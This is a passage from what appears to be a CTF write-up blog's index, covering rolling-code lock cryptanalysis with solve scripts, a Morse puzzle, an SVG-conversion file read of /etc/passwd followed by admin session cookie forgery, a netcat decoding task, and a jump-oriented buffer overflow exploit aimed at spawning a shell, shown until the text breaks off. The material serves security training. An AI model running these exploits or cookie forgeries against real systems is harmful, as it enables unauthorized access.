0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 \\color{red}{1} \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} 0 0 0 0 \\newline 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 0 0 0 \\color{red}{1} \\newline 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\newline 0 0 \\color{red}{1} \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\newline 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 \\color{red}{1} \\newline 0 0 \\color{red}{1} 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 \\color{red}{1} 0 0 \\end{pmatrix} $$\nNotice that we are working in Galois Field of 2-dimension (we only have 0 and 1). Therefore, the sum operation is the same as the XOR operation, and the product is equal to the AND operation.\nLet\u0026rsquo;s remember how the ret (rolling code we need to get the flag) is computed:\nret = 0 for _ in range(26): ret \u0026lt;\u0026lt;= 1 ret |= state \u0026amp; 1 # Changes in state  It is formed by the least significant bit of state in each iteration. So, we need the last row of matrices $I, A, A^2, A^3, \\dots, A^{24}, A^{25}$, which are related to the last bit of the current state on each iteration.\nThe idea is to solve a system of equations so that we can get the current state. With one rolling code, we have 26 equations (as the code is a 26-bit number). Although the state is 64 bits long, we have shown that every four bits, there are two that have the same value (this fact leads to 16 equations). Hence, we have 48 unknowns. Then, to solve for a complete state, we will need at least two rolling codes. We will need to concatenate the two rolling codes and compute the last row for matrices $A^0$ through $A^{47}$.\nThese will be some of the equations of the system we need to solve (where $s$ is the state and $r$ and $t$ are the two ret rolling codes):\n$$ \\begin{cases} s_{63} + s_{60} \u0026amp; = \u0026amp; 0 \\newline s_{59} + s_{56} \u0026amp; = \u0026amp; 0 \\newline \\dots \u0026amp; = \u0026amp; 0 \\newline s_3 + s_0 \u0026amp; = \u0026amp; 0 \\newline s_0 \u0026amp; = \u0026amp; r_{25} \\newline s_{61} + s_2 \u0026amp; = \u0026amp; r_{24} \\newline \\dots \u0026amp; = \u0026amp; \\dots \\newline \\dots \u0026amp; = \u0026amp; r_0 \\newline \\dots \u0026amp; = \u0026amp; t_{25} \\newline \\dots \u0026amp; = \u0026amp; \\dots \\newline \\dots \u0026amp; = \u0026amp; t_5 \\newline \\dots \u0026amp; = \u0026amp; t_4 \\newline \\end{cases} $$\nThis system of equations can be translated into matrix form like this:\n$$ M \\cdot \\begin{pmatrix} s_{63} \\newline \\dots \\newline s_0 \\end{pmatrix} = \\begin{pmatrix} 0 \\newline \\overset{(16)}{\\dots} \\newline 0 \\newline r_{25} \\newline \\dots \\newline r_0 \\newline t_{25} \\newline \\dots \\newline t_5 \\newline t_4 \\end{pmatrix} $$\nWhere $M$ rows are the first 16 equations in matrix form and the last row of the matrices $I, A, A^2, A^3, \\dots, A^{47}$.\nTo solve the system of equations, we can use Gauss elimination working in Galois Field of 2-dimension ($\\mathbb{F}_2$):\ndef gauss_elim(x_mat, b_mat): aug_mat = add_column(x_mat, b_mat) for j in range(len(x_mat)): for i in range(j + 1, len(x_mat)): if aug_mat[i][j]: aug_mat[i], aug_mat[j] = aug_mat[j].copy(), aug_mat[i].copy() break for i in range(j + 1, len(x_mat)): if aug_mat[i][j]: aug_mat[i] = [a ^ b for a, b in zip(aug_mat[i], aug_mat[j])] for j in range(len(x_mat) - 1, 0, -1): for i in range(j - 1, -1, -1): if aug_mat[i][j]: aug_mat[i] = [a ^ b for a, b in zip(aug_mat[i], aug_mat[j])] return [r[-1] for r in aug_mat]  The algorithm is well-known, so I will not explain it (one thing to consider is that we are in $\\mathbb{F}_2$). Other method to solve this is computing the inverse of $M$ in $\\mathbb{F}_2$, which can be done with SageMath.\nAnyway, I developed a Python script to solve this part of the challenge automatically:\nimport re import requests import sys # Functions and global variables url = sys.argv[1] def get_code(): r = requests.post(f'{url}/unlock', {'code': 1}) return int(re.findall(r'(\\d+)', r.text)[0]) def main(): global state code1 = get_code() code2 = get_code() codes = ('0' * 16 + f'{code1:026b}' + f'{code2:026b}')[:64] codes_vector = list(map(int, list(codes))) comp_state = gauss_elim(ret_mat, codes_vector) state = int(''.join(map(str, comp_state)), 2) next(26) next(26) code3 = next(26) r = requests.post(f'{url}/unlock', {'code': code3}) print(r.text) if __name__ == '__main__': main()  These functions take the two rolling codes from the error message in the website needed to compute the state (comp_state), and then calculate the third rolling code to send it to the lock and get the flag.\nThe variable ret_mat is matrix $M$, computed as follows:\nstate_mat_initial = [...] ret_mat = [] for i in range(16): ret_mat.append(list(map(int, list(f'{9 \u0026lt;\u0026lt; (4 * i):064b}')))) state_mat = [[int(i == j) for j in range(64)] for i in range(64)] for _ in range(48): ret_mat.append(state_mat[-1]) state_mat = multiply_matrix(state_mat, state_mat_initial)  Where state_mat_initial is the tweaked $A$ matrix.\nThen we add some operation functions to work in $\\mathbb{F}_2$. Again, these algorithms are kind of standard:\ndef multiply_vector(x_mat, y_vector): z_vector = [0 for _ in range(len(x_mat))] for i in range(len(x_mat)): for k in range(len(y_vector)): z_vector[i] ^= x_mat[i][k] \u0026amp; y_vector[k] return z_vector def multiply_matrix(x_mat, y_mat): if type(y_mat[0]) == int: return multiply_vector(x_mat, y_mat) z_mat = [[0 for _ in range(len(y_mat[0]))] for _ in range(len(x_mat))] for i in range(len(x_mat)): for j in range(len(y_mat[i])): for k in range(len(y_mat)): z_mat[i][j] ^= x_mat[i][k] \u0026amp; y_mat[k][j] return z_mat def add_column(x_mat, y_vector): z_mat = x_mat.copy() for i in range(len(y_vector)): z_mat[i].append(y_vector[i]) return z_mat  Finally, if we run the script, we get the second flag:\n$ python3 solve.py http://35.190.155.168/c33a5d03b6 Unlocked successfully. Flag: ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  ","image":"/images/web-cryptography.png","permalink":"https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-rolling-code-lock/","section":"ctf","summary":"Advanced web pentesting and cryptanalysis. XXE. Reverse Engineering","time":53,"title":"Model E1337 - Rolling Code Lock"},{"contents":"This challenge is extremely related to Model E1337 - Rolling Code Lock, specially for the cryptanalysis part. Go and check it if you have not done yet.\nAs in the previous challenge, we have a simple website that requests a code to unlock:\nWe can put any number we want and we see it is incorrect:\nThe difference with the first challenge is the length of the number, this time it is 64-bit long.\nWe should have the Python source code in order to perform the cryptanalysis process. If we remember, there was a Python script called rng.py (for Random Number Generator) in the previous challenge. We can try to access it from the web server, and here we have it:\n$ curl http://35.190.155.168/5eaafdba5d/rng  import random def setup(seed): global state state = 0 for i in range(16): cur = seed \u0026amp; 3 seed \u0026gt;\u0026gt;= 2 state = (state \u0026lt;\u0026lt; 4) | ((state \u0026amp; 3) ^ cur) state |= cur \u0026lt;\u0026lt; 2 def next(bits): global state ret = 0 for _ in range(bits): ret \u0026lt;\u0026lt;= 1 ret |= state \u0026amp; 1 for _ in range(3): state = (state \u0026lt;\u0026lt; 1) ^ (state \u0026gt;\u0026gt; 61) state \u0026amp;= 0xFFFFFFFFFFFFFFFF state ^= 0xFFFFFFFFFFFFFFFF for j in range(0, 64, 4): cur = (state \u0026gt;\u0026gt; j) \u0026amp; 0xF cur = (cur \u0026gt;\u0026gt; 3) | ((cur \u0026gt;\u0026gt; 2) \u0026amp; 2) | ((cur \u0026lt;\u0026lt; 3) \u0026amp; 8) | ((cur \u0026lt;\u0026lt; 2) \u0026amp; 4) state ^= cur \u0026lt;\u0026lt; j return ret setup((random.randrange(0x10000) \u0026lt;\u0026lt; 48) | (random.randrange(0x10000) \u0026lt;\u0026lt; 32) | (random.randrange(0x10000) \u0026lt;\u0026lt; 16) | random.randrange(0x10000))  It is pretty similar to the one on the first challenge. The differences are:\n The seed is now 64-bit long The computation of the state for each iteration of next is performed three times There are 64 iterations inside next, because ret is a 64-bit number  The resolution of the challenge follows the same idea that the previous one. We need to compute every state using matrix $A$ and take the last row (which will be the least significant bit of state, that will be appended to ret):\nret = 0 for _ in range(64): ret \u0026lt;\u0026lt;= 1 ret |= state \u0026amp; 1 for _ in range(3): # Changes in state  This time, we will need $I$, $A^3$, $A^6$ and so on until $A^{141}$ (which is $\\left(A^{47}\\right)^3$).\nFor this challenge, we only need one incorrect code (actually, the 48 most significant bits). We will solve a similar system of equations, something like this:\n$$ \\begin{cases} s_{63} + s_{60} \u0026amp; = \u0026amp; 0 \\newline s_{59} + s_{56} \u0026amp; = \u0026amp; 0 \\newline \\dots \u0026amp; = \u0026amp; 0 \\newline s_3 + s_0 \u0026amp; = \u0026amp; 0 \\newline s_0 \u0026amp; = \u0026amp; r_{63} \\newline \\dots \u0026amp; = \u0026amp; r_{62} \\newline \\dots \u0026amp; = \u0026amp; \\dots \\newline \\dots \u0026amp; = \u0026amp; r_{16} \\newline \\end{cases} $$\nWhere $s$ is the state we need and $r$ is the code shown in the error message (ret). The first 16 equations are equal to the ones on the previous challenge: for every quartet, the first and last bits are the same. The following 48 equations contain the last row of matrices $I$, $A^3$, $A^6$ until $A^{141}$ in algebraic form.\nTo solve the system, we use again Gauss Elimination over Galois Field of 2-dimension (sums are XOR operations and products are AND operations), or $\\mathbb{F}_2$.\nI used again a Python script to solve this challenge. It is pretty similar to the one shown and explained before. Matrix $A$ is the same (the tweaked one), but matrix $M$ is a little different due to the fact that the state is computed three times within an iteration of next:\nstate_mat_initial = [...] ret_mat = [] for i in range(16): ret_mat.append(list(map(int, list(f'{9 \u0026lt;\u0026lt; (4 * i):064b}')))) state_mat = [[int(i == j) for j in range(64)] for i in range(64)] for _ in range(48): ret_mat.append(state_mat[-1]) state_mat = multiply_matrix(state_mat, state_mat_initial) state_mat = multiply_matrix(state_mat, state_mat_initial) state_mat = multiply_matrix(state_mat, state_mat_initial)  And the main function only takes one code, because it is enough information to extract the state:\ndef main(): global state code1 = get_code() codes = ('0' * 16 + f'{code1:064b}')[:64] codes_vector = list(map(int, list(codes))) comp_state = gauss_elim(ret_mat, codes_vector) state = int(''.join(map(str, comp_state)), 2) next(64) code2 = next(64) r = requests.post(f'{url}/unlock', {'code': code2}) print(r.text)  Also notice that we are calling next(64) because now ret has 64 bits.\nFinally, if we run the script, we get the flag:\n$ python3 solve.py http://35.190.155.168/5eaafdba5d Unlocked successfully. Flag: ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/hacker101ctf/model-e1337-v2-hardened-rolling-code-lock/","section":"ctf","summary":"Advanced cryptanalysis. Reverse Engineering","time":4,"title":"Model E1337 v2 - Hardened Rolling Code Lock"},{"contents":"We are given this sequence of . and -:\n-.-. - ..-. .-.. . .- .-. -. ... .- -- ..- . .-.. -- --- .-. ... . .. ... -.-. --- --- .-.. -... -.-- - .... . .-- .- -.-- .. .-.. .. -.- . -.-. .... . . ...  As the title of the challenge suggests, it is Morse code. Hence, we must decode the sequence.\nWe can do it manually: -.-. is C, - is T, ..-. is F\u0026hellip; Or we can use an online decoder like morsedecoder.com:\nAnd we get this message: CTFLEARNSAMUELMORSEISCOOLBYTHEWAYILIKECHEES. So the flag is: CTFlearn{SAMUELMORSEISCOOLBYTHEWAYILIKECHEES}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/morse-code/","section":"ctf","summary":"Decoding a message in Morse code","time":1,"title":"Morse Code"},{"contents":"We are given a website like this:\nWe must register a new account and login to view a nice dashboard:\nThe only functionality we have is to export the SVG images we see as PNG files. We can capture the request with Burp Suite:\nAfter some research, we can see that there is a vulnerability regarding SVG conversion that leads to Local File Read (more information at security.snyk.io).\nWe will need to use the following payload to read /etc/passwd as a PNG image:\nAnd here we have it:\nNow we can start reading source code. For instance, we can start with /app/index.js:\nHere we see that uses /app/.env as a configuration file to load SESSION_SECRET_KEY:\nIf we read /app/routes/index.js, we see that if we are admin, we can read the flag (in /dashboard):\nSo now we must forge two cookies using the same source code above and the same value of SESSION_SECRET_KEY:\n#!/usr/bin/env node const express = require('express') const session = require('cookie-session') const cookieParser = require('cookie-parser') const app = express() app.use(express.json({ limit: '2mb' })) app.use(cookieParser()) app.use(session({ name: 'session', keys: ['5921719c3037662e94250307ec5ed1db'] })) app.get('/', (req, res) =\u0026gt; { req.session.username = 'admin' res.send({ message: req.session.username }) }) app.listen(3000, () =\u0026gt; console.log('Listening...'))  If we start the server, we can retrieve the session cookies and set them in the browser:\n$ node index.js Listening...  $ curl 127.0.0.1:3000 -si | grep Cookie Set-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0=; path=/; httponly Set-Cookie: session.sig=EYdvy2mhVoEznETyhYjNYFFZM8o; path=/; httponly  When reloading the page, we will see another image that shows the flag (HTB{fr4m3d_s3cr37s_4nd_f0rg3d_entr13s}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/mutation-lab/","section":"ctf","summary":"SVG file read through image. Forge session cookie","time":2,"title":"Mutation Lab"},{"contents":"We are given host and a port for a remote instance. If we stablish a connection using nc we get a bunch of numbers:\n$ nc mercury.picoctf.net 22902 112 105 99 111 67 84 70 123 103 48 48 100 95 107 49 116 116 121 33 95 110 49 99 51 95 107 49 116 116 121 33 95 100 51 100 102 100 54 100 102 125 10 ^C  These numbers seem to be the ASCII decimal representation of some characters.\nFor instance, 112 is p, 105 is i, 99 is c and 111 is o. So the numbers are the flag but in ASCII.\nTo decode the flag, we can use some shell scripting and Python. Since nc is keeping the connection open we can close it using timeout.\n$ timeout 1 nc mercury.picoctf.net 22902 | xargs 112 105 99 111 67 84 70 123 103 48 48 100 95 107 49 116 116 121 33 95 110 49 99 51 95 107 49 116 116 121 33 95 100 51 100 102 100 54 100 102 125 10 $ python3 -c \"print('$(timeout 1 nc mercury.picoctf.net 22902 | xargs)')\" 112 105 99 111 67 84 70 123 103 48 48 100 95 107 49 116 116 121 33 95 110 49 99 51 95 107 49 116 116 121 33 95 100 51 100 102 100 54 100 102 125 10 $ python3 -c \"print(''.join(map(chr, map(int, '$(timeout 1 nc mercury.picoctf.net 22902 | xargs)'.split()))))\" picoCTF{g00d_k1tty!_n1c3_k1tty!_d3dfd6df}  The flag can also be decoded using a Python script with pwntools:\nfrom pwn import context, remote context.log_level = 'CRITICAL' r = remote('mercury.picoctf.net', 22902) flag = [] while (c := r.recvline().strip()) != b'10': flag.append(chr(int(c.decode()))) r.close() print(''.join(flag))  $ python3 solve.py picoCTF{g00d_k1tty!_n1c3_k1tty!_d3dfd6df}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/general-skills/nice-netcat.../","section":"ctf","summary":"picoCTF 2021. 15 points. Connect to a remote instance. Decode ASCII","time":2,"title":"Nice netcat..."},{"contents":"We are given a 64-bit binary called no-return:\nArch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  Reverse engineering The binary is statically compiled and is so small that we can print the full assembly here:\n$ objdump -M intel -d no-return no-return: file format elf64-x86-64 Disassembly of section .text: 0000000000401000 \u0026lt;.text\u0026gt;: 401000: 5c pop rsp 401001: 5f pop rdi 401002: 5e pop rsi 401003: 5d pop rbp 401004: 5a pop rdx 401005: 59 pop rcx 401006: 5b pop rbx 401007: 48 31 c0 xor rax,rax 40100a: ff 67 01 jmp QWORD PTR [rdi+0x1] 40100d: 48 ff c0 inc rax 401010: de f1 fdivrp st(1),st 401012: ff 22 jmp QWORD PTR [rdx] 401014: 48 2b 74 24 10 sub rsi,QWORD PTR [rsp+0x10] 401019: f5 cmc 40101a: ff 22 jmp QWORD PTR [rdx] 40101c: 48 89 e1 mov rcx,rsp 40101f: fd std 401020: ff 22 jmp QWORD PTR [rdx] 401022: 48 8d 0c d9 lea rcx,[rcx+rbx*8] 401026: fd std 401027: ff 21 jmp QWORD PTR [rcx] 401029: 48 31 d5 xor rbp,rdx 40102c: 0f 95 c4 setne ah 40102f: ff a5 00 00 44 e8 jmp QWORD PTR [rbp-0x17bc0000] 401035: 48 01 f4 add rsp,rsi 401038: de f9 fdivp st(1),st 40103a: ff 22 jmp QWORD PTR [rdx] 40103c: 48 01 dd add rbp,rbx 40103f: 9b fwait 401040: ff 65 c7 jmp QWORD PTR [rbp-0x39] 401043: 88 a7 00 00 44 e8 mov BYTE PTR [rdi-0x17bc0000],ah 401049: f9 stc 40104a: ff 22 jmp QWORD PTR [rdx] 40104c: 59 pop rcx 40104d: 48 89 d1 mov rcx,rdx 401050: 5a pop rdx 401051: ff 21 jmp QWORD PTR [rcx] 401053: 48 ff c1 inc rcx 401056: de f1 fdivrp st(1),st 401058: ff 22 jmp QWORD PTR [rdx] 40105a: 48 92 xchg rdx,rax 40105c: de f9 fdivp st(1),st 40105e: ff 21 jmp QWORD PTR [rcx] 401060: 48 ff c3 inc rbx 401063: de f1 fdivrp st(1),st 401065: ff 22 jmp QWORD PTR [rdx] 401067: 48 87 cf xchg rdi,rcx 40106a: fd std 40106b: ff 22 jmp QWORD PTR [rdx] 40106d: 54 push rsp 40106e: 48 31 c0 xor rax,rax 401071: 48 ff c0 inc rax 401074: 48 31 ff xor rdi,rdi 401077: 48 ff c7 inc rdi 40107a: 48 89 e6 mov rsi,rsp 40107d: ba 08 00 00 00 mov edx,0x8 401082: 0f 05 syscall 401084: 48 81 ee b0 00 00 00 sub rsi,0xb0 40108b: 48 31 c0 xor rax,rax 40108e: 48 31 ff xor rdi,rdi 401091: 48 8d 36 lea rsi,[rsi] 401094: ba c0 00 00 00 mov edx,0xc0 401099: 0f 05 syscall 40109b: 48 83 c4 08 add rsp,0x8 40109f: ff 64 24 f8 jmp QWORD PTR [rsp-0x8]  This time, the binary is just built for exploitation, there is no realistic functionality.\nThe real entry-point of the binary is at address 0x40106d. We can check it in GDB:\n$ gdb -q no-return Reading symbols from no-return... (No debugging symbols found in no-return) gef➤ start [+] Breaking at entry-point: 0x40106d  So the main funcionality of the program is handled by this assembly code:\n40106d: 54 push rsp 40106e: 48 31 c0 xor rax,rax 401071: 48 ff c0 inc rax 401074: 48 31 ff xor rdi,rdi 401077: 48 ff c7 inc rdi 40107a: 48 89 e6 mov rsi,rsp 40107d: ba 08 00 00 00 mov edx,0x8 401082: 0f 05 syscall 401084: 48 81 ee b0 00 00 00 sub rsi,0xb0 40108b: 48 31 c0 xor rax,rax 40108e: 48 31 ff xor rdi,rdi 401091: 48 8d 36 lea rsi,[rsi] 401094: ba c0 00 00 00 mov edx,0xc0 401099: 0f 05 syscall 40109b: 48 83 c4 08 add rsp,0x8 40109f: ff 64 24 f8 jmp QWORD PTR [rsp-0x8]  Analyzing assembly code What the program is doing is writing data to stdout using sys_write and then reading input data using sys_read. Finally, it performs a weird jump. The `rogram just crashes when executing it normally:\n$ ./no-return Jasdf zsh: segmentation fault (core dumped) ./no-return $ echo asdf | ./no-return ~Bzsh: done echo asdf | zsh: segmentation fault (core dumped) ./no-return  Notice that in sys_write we need these values:\n $rax must be 1 $rdi stores the file decriptor (1 for stdout) $rsi has the address of the string that will be written $rdx contains the size to be written in bytes  40106d: 54 push rsp 40106e: 48 31 c0 xor rax,rax 401071: 48 ff c0 inc rax 401074: 48 31 ff xor rdi,rdi 401077: 48 ff c7 inc rdi 40107a: 48 89 e6 mov rsi,rsp 40107d: ba 08 00 00 00 mov edx,0x8 401082: 0f 05 syscall  This instruction is just a memory leak (specifically a stack address leak). We saw it earlier but this is more clear:\n$ echo asdf | ./no-return | xxd 00000000: 80c8 43e9 fc7f 0000 ..C..... zsh: done echo asdf | zsh: segmentation fault (core dumped) ./no-return | zsh: done xxd  For the sys_read, these setup is needed:\n $rax must be set to 0 $rdi must store the file descriptor (0 for stdin) $rsi must contain the address to write the data into $rdx must have the length to read  401084: 48 81 ee b0 00 00 00 sub rsi,0xb0 40108b: 48 31 c0 xor rax,rax 40108e: 48 31 ff xor rdi,rdi 401091: 48 8d 36 lea rsi,[rsi] 401094: ba c0 00 00 00 mov edx,0xc0 401099: 0f 05 syscall  The program is reading up to 0xc0 (192) bytes. And the data is stored on the stack (especifically in $rsp - 0xb0, because $rsi equals $rsp in the previous assembly block).\nFinally, the program performs a jmp instruction to the address stored in the address pointed to by $rsp - 0x8 (notice the differences between jmp rsp-0x8 and jmp QWORD PTR [rsp-0x8]), after adding 0x8 to the register:\n40109b: 48 83 c4 08 add rsp,0x8 40109f: ff 64 24 f8 jmp QWORD PTR [rsp-0x8]  Buffer Overflow vulnerability Hence, we can control this value, because the program reads up to 0xc0 bytes and the reserved stack buffer is 0xb0, so we can use the next 8 bytes to store an address to jump to (recall that NX is enabled, so we cannot add shellcode and jump to that section).\nThe only thing we have now is a stack address leak and a jmp instruction we can control. We must recall that there were more assembly instructions outside the entry-point.\nExploit strategy The strategy is use sys_execve in order to get a shell. For that purpose we need:\n $rax must be set to 0x3b $rdi must contain the address where the command string is stored (\u0026quot;/bin/sh\u0026quot;) $rsi set to 0 $rdx set to 0  In order to control $rax and $rdi we can find some gadgets:\n$ ROPgadget --binary no-return | grep ' rax' 0x000000000040100d : inc rax ; fdivrp st(1) ; jmp qword ptr [rdx] 0x0000000000401003 : pop rbp ; pop rdx ; pop rcx ; pop rbx ; xor rax, rax ; jmp qword ptr [rdi + 1] 0x0000000000401006 : pop rbx ; xor rax, rax ; jmp qword ptr [rdi + 1] 0x0000000000401005 : pop rcx ; pop rbx ; xor rax, rax ; jmp qword ptr [rdi + 1] 0x0000000000401001 : pop rdi ; pop rsi ; pop rbp ; pop rdx ; pop rcx ; pop rbx ; xor rax, rax ; jmp qword ptr [rdi + 1] 0x0000000000401004 : pop rdx ; pop rcx ; pop rbx ; xor rax, rax ; jmp qword ptr [rdi + 1] 0x0000000000401002 : pop rsi ; pop rbp ; pop rdx ; pop rcx ; pop rbx ; xor rax, rax ; jmp qword ptr [rdi + 1] 0x000000000040105a : xchg rax, rdx ; fdivp st(1) ; jmp qword ptr [rcx] 0x0000000000401007 : xor rax, rax ; jmp qword ptr [rdi + 1] $ ROPgadget --binary no-return | grep -v xor | grep ' rax' 0x000000000040100d : inc rax ; fdivrp st(1) ; jmp qword ptr [rdx] 0x000000000040105a : xchg rax, rdx ; fdivp st(1) ; jmp qword ptr [rcx] $ ROPgadget --binary no-return | grep ' rdi' 0x0000000000401001 : pop rdi ; pop rsi ; pop rbp ; pop rdx ; pop rcx ; pop rbx ; xor rax, rax ; jmp qword ptr [rdi + 1] 0x0000000000401067 : xchg rdi, rcx ; std ; jmp qword ptr [rdx]  Notice that I removed all the xor rax, rax because that instruction will break our strategy and set $rax to 0. For the moment, I will take a look at these gadgets:\n$ ROPgadget --binary no-return | grep xchg | grep -E 'rax|rdi' 0x000000000040105a : xchg rax, rdx ; fdivp st(1) ; jmp qword ptr [rcx] 0x0000000000401067 : xchg rdi, rcx ; std ; jmp qword ptr [rdx]  With these gadgets, we are able to control the contents of $rax and $rdi if we control $rdx and $rcx.\nIn order to control $rdx and $rcx, we have these set of instructions from the top of the binary:\n401000: 5c pop rsp 401001: 5f pop rdi 401002: 5e pop rsi 401003: 5d pop rbp 401004: 5a pop rdx 401005: 59 pop rcx 401006: 5b pop rbx 401007: 48 31 c0 xor rax,rax 40100a: ff 67 01 jmp QWORD PTR [rdi+0x1]  Notice that the last instruction is a jmp instruction to the address pointed to by the address stored in $rdi + 1, so we must store an address that contains a valid executable address in $rdi + 1 (we can\u0026rsquo;t set the address of \u0026quot;/bin/sh\u0026quot; yet). Moreover, although there is a pop rax, then xor rax, rax sets it to 0, so neither we can set $rax to 0x3b.\nHence, the idea is to control $rcx and $rdx and then call one of the previous gadgets. But there is a problem if we want to execute both, because they are kind of symmetric, and once the values are correct in the first gadget, then for the second one they will cause a crash. And we can\u0026rsquo;t go through the previous set of instruction because we lose $rax and $rdi.\nTweaking the strategy Therefore, we will be using just one of the gadgets. In order to set the value of $rdi, I will use sys_rt_sigreturn, to restore a frame to the registers, so they are fully controlled.\nFor a sys_rt_sigreturn, we need that $rax equals 0xf, and nothing more. Hence, we can set this value with:\n0x000000000040105a : xchg rax, rdx ; fdivp st(1) ; jmp qword ptr [rcx]  So, $rdx must have a 0xf and then the address pointed to by $rcx must contain the address of a syscall instruction (0x401082 or 0x401099). Once we reach the sys_rt_sigreturn step, we will set the registers to execute sys_execve.\nExploit development Now that we have the strategy clear, we must implement it. First of all, we need to put data on the stack.\nWe may notice that we can use the last jmp instruction of the program to jump again to the entry-point. At first glance, this is not useful, but we can use a trick. Recall that the program reads up to 0xc0 bytes, but only 0xb0 were reserved. This is a kind of a Buffer Overflow vulnerability, but there is no return address to control.\nActually, there are no gadgets that end in ret, all of them end with a jmp instruction. In fact, the technique we are using is called JOP (Jump Oriented Programming).\nCreating space for the payload The key here is that we have 16 bytes to write. The first 8 bytes must contain an address to be executed next with the last jmp instruction. But I will use the second 8 bytes to leave the stack a bit cleaner. Hence, the first 8 bytes will store address 0x40109b (add rsp, 0x8), so that we reach again the jmp instruction, but with the stack totally clean for the next stack frame. The second 8 bytes will contain the address of the entry-point, you\u0026rsquo;ll figure out why in a second.\nFor the moment, we can write a loop in a Python script that has this functionality:\n#!/usr/bin/env python3 from pwn import * context.binary = 'no-return' def get_process(): if len(sys.argv) == 1: return context.binary.process() host, port = sys.argv[1].split(':') return remote(host, int(port)) def main(): p = get_process() offset = 176 junk = b'A' * offset for _ in range(8): leak = u64(p.recv(8).ljust(8, b'\\0')) log.info(f'Stack address leak: {hex(leak)}') payload = junk payload += p64(0x40109b) payload += p64(0x40106d) p.send(payload)  $ python3 solve.py [*] './no-return' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled 